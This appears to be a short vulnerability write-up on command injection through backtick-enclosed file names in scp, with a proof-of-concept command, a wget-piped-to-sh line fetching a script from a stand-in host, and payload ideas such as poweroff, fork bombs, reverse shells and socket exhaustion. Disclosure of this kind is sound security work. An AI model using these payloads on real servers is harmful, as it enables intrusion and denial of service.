# Abount SCP
scp is a program for copying files between computers. It uses the SSH protocol. It is included by default in most Linux and Unix distributions
 
# issue
At time of coping a file to remote server, it executes a local command with appending file path at end of local scp command.
For example, if you execute following command
```sh
scp SourceFile user@host:directory/TargetFile
```

it will execute a local command 
```sh
scp -t directory/TargetFile
```

At time of creating local scp command, it does not sanitise file name.
An attacker can pass a backtick enabled payload as file name and when local scp command is executed, local shell will also execute backtick enabled command

## Example

execute following command with scp
```sh
scp  /sourcefile remoteserver:'`touch /tmp/exploit.sh`/tmp/target.txt'
```

After executing this command, go to remote server and you will see in /tmp/ directory that file exploit.sh is present.

## Exploit scenarios
- Scenaios where ssh is blocked for user but scp allowed by command option in authorized_keys file. You can bypass this ristriction and execute command on remote server.
- SCP supports directory transfer with " -r " option. As linux allows backtick (`) in file name. attacker can create a payload and file name and when a victim is coping complete folder to remote server, payload in the file name will execute

## What we can do with this issue
- Attacker can put "`poweroff`" or a fork bomb in file name and it will casue server to crash or restart which will result in a DOS attack.
- Attacker can get bind/reverse shell with various tricks like bash bind shell or execute sh file like "wget https://unknownsource.com/possiblydangerous.sh -O- | sh"
- As SHELL will first execute the backtick command and then will execute scp command, we can just write an infinite loop in backtick which will cause socket to be open for a long time. Multiple such attacks will not leave sockets for new conntion and will result in DDOS.
